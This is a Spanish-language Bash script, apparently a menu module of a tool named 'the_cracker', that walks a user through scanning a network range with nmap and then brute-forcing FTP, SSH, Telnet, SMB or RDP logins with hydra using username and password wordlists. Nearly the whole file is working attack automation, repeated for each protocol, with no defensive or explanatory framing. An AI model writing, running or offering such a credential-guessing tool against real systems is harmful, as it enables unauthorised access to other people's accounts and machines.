#!/bin/bash

source requisitos/0.sh

Title
echo " [2] Desencriptar un Protocolo Online y Local (ftp, ssh, ...)"
echo
echo " =================================="
echo " 1º Desencriptar Protocolo FTP""    |"
echo " ----------------------------------"
echo " 2º Desencriptar Protocolo SSH""    |"
echo " ----------------------------------"
echo " 3º Desencriptar Protocolo Telnet"" |"
echo " ----------------------------------"
echo " 4º Desencriptar Protocolo SMB""    |"
echo " ----------------------------------"
echo " 5º Desencriptar Protocolo RDP""    |"
echo " ----------------------------------"
echo " 6º Volver al Menu""                |"
echo " =================================="
echo
echo
read -p " [*] Elige una opcion: " opc1
	case $opc1 in
            1 ) echo
                echo " =================================================="
                echo " 1º Escaneo (Ip + Puertos) + Ataque (Diccionario)"" |"
                echo " --------------------------------------------------"
                echo " 2º Ataque de Diccionario a URL o IP+Puerto""       |"
                echo " --------------------------------------------------"
                echo " 3º Volver al Menu""                                |"
                echo " =================================================="
                echo
                echo
                read -p " [*] Elige una opcion: " opc1
                    case $opc1 in
                            1 ) echo
                                read -p " [*] Escribe la Ip de Red + la Mascara (Ej: 192.168.1.0/24 o 128.0.0.0/16): " IpRed
                                sudo gnome-terminal --geometry 80x38+1300+20 -- bash -c "sudo nmap -Pn -T4 -p 21 --open \"$IpRed\" | awk '/^Nmap scan report/{printf \"* %s\\n\", \$NF; next} 1'; sleep 999;"
                                read -p " [*] Escribe la Ip del Objetivo (Ej: 192.168.1.43): " Ip
                                read -p " [*] Escribe el puerto Objetivo (Ej: 21): " puerto
                                sudo pkill gnome-terminal
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 ftp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 ftp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac
                                ;;
                            2 ) echo
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                read -p " [*] Escribe la Direccion o Ip (Ej: ftp.prueba.com / 192.168.1.10): " Ip
                                read -p " [*] Escribe el puerto (Ej: 21): " puerto
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 ftp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 ftp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac 
                    esac
                ;;
            2 ) echo
                echo " =================================================="
                echo " 1º Escaneo (Ip + Puertos) + Ataque (Diccionario)"" |"
                echo " --------------------------------------------------"
                echo " 2º Ataque de Diccionario a URL o IP+Puerto""       |"
                echo " --------------------------------------------------"
                echo " 3º Volver al Menu""                                |"
                echo " =================================================="
                echo
                echo
                read -p " [*] Elige una opcion: " opc1
                    case $opc1 in
                            1 ) echo
                                read -p " [*] Escribe la Ip de Red + la Mascara (Ej: 192.168.1.0/24 o 128.0.0.0/16): " IpRed
                                sudo gnome-terminal --geometry 80x38+1300+20 -- bash -c "sudo nmap -Pn -T4 -p 22 --open \"$IpRed\" | awk '/^Nmap scan report/{printf \"* %s\\n\", \$NF; next} 1'; sleep 999;"
                                read -p " [*] Escribe la Ip del Objetivo (Ej: 192.168.1.43): " Ip
                                read -p " [*] Escribe el puerto Objetivo (Ej: 22): " puerto
                                sudo pkill gnome-terminal
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 ssh://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 ssh://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac
                                ;;
                            2 ) echo
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                read -p " [*] Escribe la Direccion o Ip (Ej: ftp.prueba.com / 192.168.1.10): " Ip
                                read -p " [*] Escribe el puerto (Ej: 22): " puerto
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 ssh://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 ssh://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac 
                    esac
                ;;
            3 ) echo
                echo " =================================================="
                echo " 1º Escaneo (Ip + Puertos) + Ataque (Diccionario)"" |"
                echo " --------------------------------------------------"
                echo " 2º Ataque de Diccionario a URL o IP+Puerto""       |"
                echo " --------------------------------------------------"
                echo " 3º Volver al Menu""                                |"
                echo " =================================================="
                echo
                echo
                read -p " [*] Elige una opcion: " opc1
                    case $opc1 in
                            1 ) echo
                                read -p " [*] Escribe la Ip de Red + la Mascara (Ej: 192.168.1.0/24 o 128.0.0.0/16): " IpRed
                                sudo gnome-terminal --geometry 80x38+1300+20 -- bash -c "sudo nmap -Pn -T4 -p 23 --open \"$IpRed\" | awk '/^Nmap scan report/{printf \"* %s\\n\", \$NF; next} 1'; sleep 999;"
                                read -p " [*] Escribe la Ip del Objetivo (Ej: 192.168.1.43): " Ip
                                read -p " [*] Escribe el puerto Objetivo (Ej: 23): " puerto
                                sudo pkill gnome-terminal
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 telnet://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 telnet://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac
                                ;;
                            2 ) echo
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                read -p " [*] Escribe la Direccion o Ip (Ej: ftp.prueba.com / 192.168.1.10): " Ip
                                read -p " [*] Escribe el puerto (Ej: 23): " puerto
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 telnet://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 telnet://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac 
                    esac
                ;;
            4 ) echo
                echo " =================================================="
                echo " 1º Escaneo (Ip + Puertos) + Ataque (Diccionario)"" |"
                echo " --------------------------------------------------"
                echo " 2º Ataque de Diccionario a URL o IP+Puerto""       |"
                echo " --------------------------------------------------"
                echo " 3º Volver al Menu""                                |"
                echo " =================================================="
                echo
                echo
                read -p " [*] Elige una opcion: " opc1
                    case $opc1 in
                            1 ) echo
                                read -p " [*] Escribe la Ip de Red + la Mascara (Ej: 192.168.1.0/24 o 128.0.0.0/16): " IpRed
                                sudo gnome-terminal --geometry 80x38+1300+20 -- bash -c "sudo nmap -Pn -T4 -p 445 --open \"$IpRed\" | awk '/^Nmap scan report/{printf \"* %s\\n\", \$NF; next} 1'; sleep 999;"
                                read -p " [*] Escribe la Ip del Objetivo (Ej: 192.168.1.43): " Ip
                                read -p " [*] Escribe el puerto Objetivo (Ej: 445): " puerto
                                sudo pkill gnome-terminal
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 smb://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 smb://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac
                                ;;
                            2 ) echo
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                read -p " [*] Escribe la Direccion o Ip (Ej: ftp.prueba.com / 192.168.1.10): " Ip
                                read -p " [*] Escribe el puerto (Ej: 445): " puerto
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 smb://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 smb://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac 
                    esac
                ;;
            5 ) echo
                echo " =================================================="
                echo " 1º Escaneo (Ip + Puertos) + Ataque (Diccionario)"" |"
                echo " --------------------------------------------------"
                echo " 2º Ataque de Diccionario a URL o IP+Puerto""       |"
                echo " --------------------------------------------------"
                echo " 3º Volver al Menu""                                |"
                echo " =================================================="
                echo
                echo
                read -p " [*] Elige una opcion: " opc1
                    case $opc1 in
                            1 ) echo
                                read -p " [*] Escribe la Ip de Red + la Mascara (Ej: 192.168.1.0/24 o 128.0.0.0/16): " IpRed
                                sudo gnome-terminal --geometry 80x38+1300+20 -- bash -c "sudo nmap -Pn -T4 -p 3389 --open \"$IpRed\" | awk '/^Nmap scan report/{printf \"* %s\\n\", \$NF; next} 1'; sleep 999;"
                                read -p " [*] Escribe la Ip del Objetivo (Ej: 192.168.1.43): " Ip
                                read -p " [*] Escribe el puerto Objetivo (Ej: 3389): " puerto
                                sudo pkill gnome-terminal
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 rdp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 rdp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac
                                ;;
                            2 ) echo
                                echo
                                echo " =============================================="
                                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                                echo " ----------------------------------------------"
                                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                                echo " =============================================="
                                echo
                                read -p " [*] Elige una opcion: " opc2
                                read -p " [*] Escribe la Direccion o Ip (Ej: ftp.prueba.com / 192.168.1.10): " Ip
                                read -p " [*] Escribe el puerto (Ej: 3389): " puerto
                                if [ $opc2 = 1 ]
                                    then
                                        read -p " [*] Escribe el usuario (Ej: admin): " usr
                                    else
                                        read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " usrdicc1
                                fi
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " passdicc2
                                Title
                                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                                echo
                                    case $opc2 in
                                            1 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -l $usr -P $passdicc2 rdp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            2 )	echo
                                                prueba2=`echo $passdicc2 | head -c 1`
                                                prueba1=`echo $usrdicc1 | head -c 1`
                                                coma="'"
                                                if [ $prueba2 = $coma ]
                                                    then
                                                        passdicc2=`echo $passdicc2 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                if [ $prueba1 = $coma ]
                                                    then
                                                        usrdicc1=`echo $usrdicc1 | cut -c 2- | rev | cut -c2- | rev`
                                                fi
                                                sudo hydra -L $usrdicc1 -P $passdicc2 rdp://$Ip:$puerto -t 4 -f -V -I
                                                ;;
                                            * )	echo
                                                echo "$RRPLY No es una opcion valida"
                                    esac 
                    esac
                ;;
            6 ) bash the_cracker.sh
                ;;
            * )	echo
				echo "$RRPLY No es una opcion valida"
				sleep 3
				bash requisitos/2.sh
	esac
echo
echo
echo " ==================="
echo " 1-Volver al Menu"
echo " 2-Volver a ejecutar"
echo " 3-Salir"
echo " ==================="
echo
read -p " [*] Elige una opcion: " opc3
	case $opc3 in
			1 )	bash the_cracker.sh
				;;
			2 )	bash requisitos/2.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
  
